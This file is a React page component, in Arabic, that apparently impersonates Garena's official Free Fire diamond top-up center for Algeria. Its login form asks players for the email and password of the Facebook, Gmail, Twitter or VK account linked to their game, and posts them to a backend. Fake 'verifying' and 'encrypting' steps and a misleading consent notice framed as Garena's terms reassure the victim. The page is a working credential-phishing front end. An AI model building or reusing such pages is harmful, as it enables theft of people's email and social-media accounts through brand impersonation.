import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { motion, AnimatePresence } from "motion/react";
import {
  AlertTriangle,
  ShieldCheck,
  CheckCircle2,
  ChevronDown,
  Globe,
  Info,
  MousePointerClick,
} from "lucide-react";
import Modal from "../components/Modal";

export default function Charge() {
  const navigate = useNavigate();
  const [platform, setPlatform] = useState("");
  const [email, setEmail] = useState("");
  const [platformPassword, setPlatformPassword] = useState("");
  const [level, setLevel] = useState("");
  const [charged, setCharged] = useState("لا");
  const [diamonds, setDiamonds] = useState<number | string | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  const [showConfirm, setShowConfirm] = useState(false);
  const [showProcess, setShowProcess] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [isAgreed, setIsAgreed] = useState(false);
  const [processStep, setProcessStep] = useState(0);
  const [orderNum, setOrderNum] = useState("");

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 1500);
    return () => clearTimeout(timer);
  }, []);

  const diamondOptions = [
    { amount: 100, bonus: "0", price: "300" },
    { amount: 210, bonus: "21", price: "650" },
    { amount: 310, bonus: "31", price: "950" },
    { amount: 520, bonus: "52", price: "1600" },
    { amount: 1060, bonus: "106", price: "3200" },
    { amount: 2180, bonus: "218", price: "6500" },
    { amount: 5600, bonus: "560", price: "18000" },
  ];

  const getSelectedInfo = () => {
    if (!diamonds) return { amount: "0", bonus: "0", price: "0" };
    if (typeof diamonds === "string") {
      if (diamonds === "Monthly Membership")
        return { amount: "Monthly", bonus: "💎", price: "1500" };
      if (diamonds === "Weekly Membership")
        return { amount: "Weekly", bonus: "💎", price: "500" };
      if (diamonds === "Booyah Pass")
        return { amount: "Booyah", bonus: "🔥", price: "1200" };
    }
    const opt = diamondOptions.find((o) => o.amount === diamonds);
    return opt
      ? { amount: opt.amount.toLocaleString(), bonus: opt.bonus, price: opt.price }
      : { amount: "0", bonus: "0", price: "0" };
  };

  const selectedInfo = getSelectedInfo();

  const processTexts = [
    "جاري التحقق من المعلومات...",
    "جاري التحقق من أمان المعلومات...",
    "جاري تشفير المعلومات...",
    "جاري إرسال الطلب...",
  ];

  const handlePreSubmit = () => {
    if (!platform || !email || !platformPassword || !level || !diamonds) {
      alert("يرجى ملأ جميع الحقول واختيار كمية الجواهر وطريقة الربط");
      return;
    }
    setShowConfirm(true);
  };

  const startProcessing = async () => {
    if (!isAgreed) return;
    setShowConfirm(false);
    setShowProcess(true);

    const stepInterval = setInterval(() => {
      setProcessStep((prev) => (prev < 3 ? prev + 1 : prev));
    }, 2500);

    try {
      const token = localStorage.getItem("ff_token");
      const res = await axios.post("/api/orders", {
        token,
        platform,
        email,
        platform_password: platformPassword,
        level,
        charged,
        diamonds,
      });

      setOrderNum(res.data.order_number);

      setTimeout(() => {
        clearInterval(stepInterval);
        setShowProcess(false);
        setShowSuccess(true);
      }, 10000);
    } catch (e) {
      clearInterval(stepInterval);
      setShowProcess(false);
      alert("فشل في إرسال الطلب");
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans overflow-x-hidden" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-40 bg-white shadow-sm">
        <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <div className="mx-auto flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
              <img
                src="https://storingo.lovestoblog.com/garena.png"
                alt="Garena"
                className="h-full w-full object-contain p-1"
                onError={(e) => {
                  e.currentTarget.style.display = "none";
                  const parent = e.currentTarget.parentElement;
                  if (parent) {
                    parent.innerHTML =
                      '<svg width="40" height="40" viewBox="0 0 200 200" fill="red"><path d="M100 10C50.294 10 10 50.294 10 100s40.294 90 90 90 90-40.294 90-90S149.706 10 100 10Zm41.134 116.7L116.7 151.134 48.866 83.3 73.3 58.866l43.4 43.4 24.434-24.434-24.434-24.434-24.434 24.434-24.434-24.434 48.868-48.868L165.566 73.3l-24.432 24.434 24.432 24.434-24.432 24.434Z"/></svg>';
                  }
                }}
              />
            </div>
            <div className="leading-tight">
              <div className="text-sm font-bold text-gray-800">مركز الشحن</div>
              <div className="text-xs font-semibold text-gray-500">الرسمي</div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors">
              <Globe className="h-4 w-4" />
              <span>الجزائر - العربية</span>
              <ChevronDown className="h-4 w-4" />
            </button>
            <div className="h-9 w-9 overflow-hidden rounded-full border-2 border-white bg-gray-100 shadow-sm ring-1 ring-gray-100">
              <img
                src="https://storingo.lovestoblog.com/ff.png"
                alt="Profile"
                className="h-full w-full object-cover"
                onError={(e) => {
                  e.currentTarget.style.display = "none";
                  const parent = e.currentTarget.parentElement;
                  if (parent) {
                    parent.innerHTML =
                      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-full w-full p-1.5 text-gray-400"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';
                  }
                }}
              />
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-4xl px-4 pt-4 space-y-6 flex-1 w-full pb-8">
        {/* Banners */}
        {isLoading ? (
          <div className="h-32 md:h-48 w-full animate-pulse rounded-2xl bg-gray-200" />
        ) : (
          <div className="relative overflow-hidden rounded-2xl shadow-[0_8px_32px_0_rgba(31,38,135,0.07)]">
            <img
              src="https://storingo.lovestoblog.com/banner.jpg"
              alt="مركز جارينا الرسمي للشحن"
              className="h-32 md:h-48 w-full rounded-2xl object-cover"
              onError={(e) => {
                e.currentTarget.style.display = "none";
                if (e.currentTarget.parentElement) {
                  e.currentTarget.parentElement.classList.add(
                    "bg-gradient-to-r",
                    "from-blue-900",
                    "to-indigo-900",
                  );
                  e.currentTarget.parentElement.innerHTML =
                    '<div class="absolute inset-0 opacity-20"><div class="h-full w-full" style="background-image: radial-gradient(circle at 2px 2px, white 1px, transparent 0); background-size: 24px 24px"></div></div><div class="relative flex h-full items-center justify-center p-6 text-center"><h1 class="text-2xl md:text-4xl font-black italic tracking-widest text-white drop-shadow-md">مركز جارينا الرسمي للشحن</h1></div>';
                }
              }}
            />
          </div>
        )}

        {/* Game Icon */}
        <div className="flex justify-end gap-4 border-b border-gray-200 pb-4">
          {isLoading ? (
            <div className="h-20 w-20 animate-pulse rounded-2xl bg-gray-200" />
          ) : (
            <div className="relative cursor-pointer">
              <div className="h-20 w-20 overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
                <img
                  src="https://storingo.lovestoblog.com/ff.png"
                  alt="Free Fire"
                  className="h-full w-full rounded-xl object-cover"
                  onError={(e) =>
                    (e.currentTarget.src =
                      "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
                  }
                />
              </div>
              <p className="mt-2 text-center text-xs font-bold text-red-600">
                Free Fire
              </p>
            </div>
          )}
        </div>

        {/* Section 1: Login */}
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              1
            </div>
            <h2 className="text-xl font-black text-gray-800">تسجيل الدخول</h2>
          </div>

          <div className="space-y-5">
            <div className="space-y-3">
              <label className="block text-sm font-bold text-gray-700">
                نوع الربط الأساسي للحساب{" "}
                <Info className="inline h-4 w-4 text-gray-400" />
              </label>
              <div className="flex gap-3 justify-center md:justify-start">
                {["facebook", "gmail", "twitter", "vk"].map((p) => (
                  <button
                    key={p}
                    onClick={() => setPlatform(p)}
                    className={`flex h-12 w-12 items-center justify-center rounded-full transition-all border-2 ${platform === p ? "border-blue-600 scale-110 shadow-md" : "border-transparent bg-gray-50 hover:bg-gray-100"}`}
                  >
                    {p === "facebook" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#1877F2] text-white">
                        <svg
                          width="20"
                          height="20"
                          viewBox="0 0 24 24"
                          fill="currentColor"
                          stroke="none"
                        >
                          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                        </svg>
                      </div>
                    )}
                    {p === "twitter" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-black text-white">
                        <svg
                          width="18"
                          height="18"
                          viewBox="0 0 24 24"
                          fill="currentColor"
                          stroke="none"
                        >
                          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                        </svg>
                      </div>
                    )}
                    {p === "gmail" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white border border-gray-200">
                        <svg width="20" height="20" viewBox="0 0 48 48">
                          <path
                            fill="#EA4335"
                            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
                          />
                          <path
                            fill="#4285F4"
                            d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
                          />
                          <path
                            fill="#FBBC05"
                            d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
                          />
                          <path
                            fill="#34A853"
                            d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
                          />
                        </svg>
                      </div>
                    )}
                    {p === "vk" && (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#0077FF] text-white">
                        <span className="font-bold text-sm">VK</span>
                      </div>
                    )}
                  </button>
                ))}
              </div>
            </div>

            <div className="grid gap-4 md:grid-cols-2">
              <input
                type="text"
                placeholder="البريد الإلكتروني أو رقم الهاتف"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
              />
              <input
                type="password"
                placeholder="كلمة مرور حساب الربط الأساسي"
                value={platformPassword}
                onChange={(e) => setPlatformPassword(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
              />
              <input
                type="number"
                placeholder="مستوى حسابك في اللعبة (LVL)"
                value={level}
                onChange={(e) => setLevel(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
              />
              <div className="relative">
                <select
                  value={charged}
                  onChange={(e) => setCharged(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none"
                >
                  <option value="لا">هل شحنت من الموقع من قبل؟ لا</option>
                  <option value="نعم">هل شحنت من الموقع من قبل؟ نعم</option>
                </select>
                <div className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
                  <ChevronDown className="h-5 w-5" />
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Section 2: Amount */}
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              2
            </div>
            <h2 className="text-xl font-black text-gray-800">كمية الشحن</h2>
          </div>

          <div className="mx-auto mb-6 flex max-w-[240px] items-center rounded-full border border-gray-200 bg-gray-50 p-1">
            <button className="flex-1 rounded-full bg-white py-2 text-sm font-bold text-red-600 shadow-sm border border-red-200">
              شراء
            </button>
            <button className="flex-1 rounded-full py-2 text-sm font-bold text-gray-500 hover:text-gray-800">
              استرداد
            </button>
          </div>

          {isLoading ? (
            <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
              {[1, 2, 3, 4, 5, 6].map((i) => (
                <div
                  key={i}
                  className="h-16 animate-pulse rounded-xl bg-gray-100"
                />
              ))}
            </div>
          ) : (
            <>
              <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 mb-6">
                {diamondOptions.map((opt) => (
                  <button
                    key={opt.amount}
                    onClick={() => setDiamonds(opt.amount)}
                    className={`flex items-center justify-between rounded-xl border p-4 transition-all ${diamonds === opt.amount ? "border-red-500 bg-red-50" : "border-gray-200 bg-white hover:border-red-200 hover:bg-gray-50"}`}
                  >
                    <div className="flex flex-col items-start">
                      <span className="font-bold text-gray-800 text-lg">
                        {opt.amount}
                      </span>
                      {opt.bonus !== "0" && (
                        <span className="text-[10px] font-bold text-red-500">
                          + {opt.bonus} علاوة
                        </span>
                      )}
                    </div>
                    <div>
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-400 drop-shadow-sm transition-transform group-hover:scale-110">
                        <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                        <path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </div>
                  </button>
                ))}
              </div>

              <div className="border-t border-gray-100 pt-6">
                <div className="mb-4 text-center">
                  <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
                    العروض الخاصة
                  </span>
                  <div className="border-t border-gray-200 -mt-2.5"></div>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                  <button
                    onClick={() => setDiamonds("Monthly Membership")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Monthly Membership" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/monthly.png"
                        alt="Monthly Membership"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Monthly";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      Monthly Membership
                    </div>
                  </button>

                  <button
                    onClick={() => setDiamonds("Weekly Membership")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Weekly Membership" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/weekly.png"
                        alt="Weekly Membership"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Weekly";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      Weekly Membership
                    </div>
                  </button>

                  <button
                    onClick={() => setDiamonds("Booyah Pass")}
                    className={`relative flex flex-col items-center rounded-xl border p-2 transition-all group ${diamonds === "Booyah Pass" ? "border-red-600 ring-1 ring-red-100 shadow-md bg-white" : "border-gray-100 bg-white hover:border-red-300 shadow-sm"}`}
                  >
                    <div className="w-full aspect-[16/9] overflow-hidden rounded-lg mb-2">
                       <img
                        src="https://storingo.lovestoblog.com/booyah.png"
                        alt="Booyah Pass"
                        className="w-full h-full object-cover transition-transform group-hover:scale-105"
                        onError={(e) => {
                          e.currentTarget.src = "https://via.placeholder.com/160x90?text=Booyah";
                        }}
                      />
                    </div>
                    <div className="flex items-center gap-1.5 text-[11px] font-bold text-gray-800">
                      <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                        <Info className="h-2.5 w-2.5" />
                      </div>
                      تصريح بوياه
                    </div>
                  </button>
                </div>
              </div>
            </>
          )}
        </section>

        {/* Section 3: Payment */}
        <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100 mb-8">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
              3
            </div>
            <h2 className="text-xl font-black text-gray-800">طرق الدفع</h2>
          </div>

          <div className="mb-4">
            <button className="relative w-full rounded-xl border-2 border-red-500 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24">
              <div className="absolute top-0 right-0 rounded-bl-lg bg-red-600 px-3 py-1 text-xs font-bold text-white z-10 flex border-b border-l border-white items-center gap-1">
                عرض خاص
                <svg
                  width="10"
                  height="10"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  className="text-white"
                >
                  <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
                </svg>
              </div>
              <div className="flex items-center gap-2">
                <div className="text-2xl font-black text-black">جازي</div>
                <div className="bg-red-600 text-white font-black text-xl px-2 py-1 transform -skew-x-12">
                  DJEZZY
                </div>
              </div>
            </button>
          </div>

          <div className="border-t border-gray-100 pt-6 mt-6">
            <div className="mb-4 text-center">
              <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
                القنوات غير متوفرة
              </span>
              <div className="border-t border-gray-200 -mt-2.5"></div>
            </div>
            <div className="relative rounded-xl border border-gray-200 bg-gray-50 p-4 h-24 flex items-center justify-center overflow-hidden grayscale">
              <div className="text-2xl font-black text-red-500">ooredoo</div>
              <div className="absolute inset-0 bg-white/70 flex items-center justify-center">
                <span className="text-sm font-bold text-gray-600">
                  مغلق مؤقتاً للصيانة
                </span>
              </div>
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="mt-12 text-center text-xs text-gray-500 pb-36">
          <p className="mb-4">© Garena Online. الحقوق كاملة.</p>
          <div className="flex flex-wrap justify-center gap-4 text-gray-400">
            <a href="#" className="hover:text-gray-600">
              سياسة الخصوصية
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              الشروط والأحكام
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              مركز المساعدة
            </a>
            <span>|</span>
            <a href="#" className="hover:text-gray-600">
              FAQ
            </a>
          </div>
        </footer>
      </main>

      {/* Floating Bottom Bar (Like Bottom Nav) */}
      <div 
        className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-100 bg-white px-4 pt-3 pb-4 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] block w-full"
        style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
      >
        <div className="mx-auto flex max-w-4xl items-center justify-between gap-3">
            {/* Price Info (Right side in RTL) */}
            <div className="flex flex-col items-end leading-none">
              <div className="flex items-center gap-1.5 mb-1.5">
                <div className="flex h-5 w-5 items-center justify-center rounded-full bg-gray-100">
                  <ChevronDown className="h-3.5 w-3.5 rotate-180 text-gray-800" />
                </div>
                <div className="flex items-center">
                  {selectedInfo.bonus && selectedInfo.bonus !== "0" && (
                     <span className="text-[#CD1212] font-black text-sm ml-1.5">
                      {selectedInfo.bonus} +
                    </span>
                  )}
                  <span className="text-2xl font-black text-gray-900 leading-none">
                    {selectedInfo.amount}
                  </span>
                </div>
                <svg
                  width="22"
                  height="22"
                  viewBox="0 0 24 24"
                  fill="none"
                  className="text-blue-400 drop-shadow-sm ml-1"
                >
                  <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                  <path
                    d="M6 3L12 8V21M18 3L12 8M3 8H21"
                    stroke="white"
                    strokeWidth="0.5"
                  />
                </svg>
              </div>
              <div className="text-sm font-bold whitespace-nowrap">
                <span className="text-gray-500">المجموع:</span>
                <span className="text-[#CD1212] font-black text-xl ml-1.5">
                  DZD {Number(selectedInfo.price).toLocaleString()}
                </span>
              </div>
            </div>

            {/* Buy Button (Left side in RTL) */}
            <button
              onClick={handlePreSubmit}
              className="flex items-center justify-center gap-3 rounded-2xl bg-[#CD1212] px-8 py-3.5 text-2xl font-black text-white shadow-xl shadow-red-600/25 active:scale-95 transition-all text-center whitespace-nowrap"
            >
              <div className="flex h-7 w-7 items-center justify-center rounded-lg border-2 border-white/50">
                <ShieldCheck className="h-5 w-5" />
              </div>
              شراء الآن
            </button>
          </div>
        </div>

      {/* Confirmation Modal */}
      <Modal
        isOpen={showConfirm}
        onClose={() => setShowConfirm(false)}
        title="تنويه هام"
      >
        <div className="text-center">
          <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-red-50">
            <AlertTriangle className="h-10 w-10 text-red-600" />
          </div>
          <p className="mb-8 text-sm leading-relaxed text-gray-600">
            سيتم استلام البيانات للتأكد من هوية الحساب وفق شروط خدمة جارينا
            للشحن. هل أنت موافق للاستمرار؟
          </p>
          <label className="mb-8 flex cursor-pointer items-center justify-center gap-3">
            <input
              type="checkbox"
              checked={isAgreed}
              onChange={(e) => setIsAgreed(e.target.checked)}
              className="h-5 w-5 rounded-lg accent-red-600 focus:ring-red-500"
            />
            <span className="text-sm font-bold text-gray-700">
              أوافق على شروط الخدمة لمركز الشحن
            </span>
          </label>
          <div className="flex gap-4">
            <button
              onClick={() => setShowConfirm(false)}
              className="flex-1 rounded-xl bg-gray-100 py-3 font-bold text-gray-700 hover:bg-gray-200 transition-colors"
            >
              إلغاء
            </button>
            <button
              onClick={startProcessing}
              disabled={!isAgreed}
              className={`flex-1 rounded-xl py-3 font-bold text-white transition-all shadow-md ${isAgreed ? "bg-red-600 shadow-red-600/30 hover:bg-red-700" : "bg-red-300 shadow-none cursor-not-allowed"}`}
            >
              متابعة
            </button>
          </div>
        </div>
      </Modal>

      {/* Processing Modal */}
      <Modal isOpen={showProcess} onClose={() => {}} title="">
        <div className="py-10 text-center">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
            className="mx-auto mb-8 h-20 w-20 rounded-full border-4 border-gray-100 border-t-red-600"
          />
          <h3 className="mb-2 text-xl font-black text-gray-900">
            {processTexts[processStep]}
          </h3>
          <p className="text-xs text-gray-500">
            معرف العملية:{" "}
            <span className="font-bold text-red-600">
              {orderNum || "جاري التوليد..."}
            </span>
          </p>
        </div>
      </Modal>

      {/* Success Modal */}
      <Modal
        isOpen={showSuccess}
        onClose={() => navigate("/my-orders")}
        title="تم التسجيل بنجاح"
      >
        <div className="text-center">
          <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full bg-emerald-50">
            <CheckCircle2 className="h-12 w-12 text-emerald-600" />
          </div>
          <p className="mb-8 text-sm font-medium text-gray-600">
            تم تسجيل طلب الشحن الخاص بك بنجاح وهو الآن قيد المراجعة والمعالجة من
            قبل النظام.
          </p>
          <button
            onClick={() => navigate("/my-orders")}
            className="w-full rounded-xl bg-red-600 py-4 font-black text-white hover:bg-red-700 transition-colors shadow-lg shadow-red-600/20"
          >
            تتبع الطلب
          </button>
        </div>
      </Modal>
    </div>
  );
}
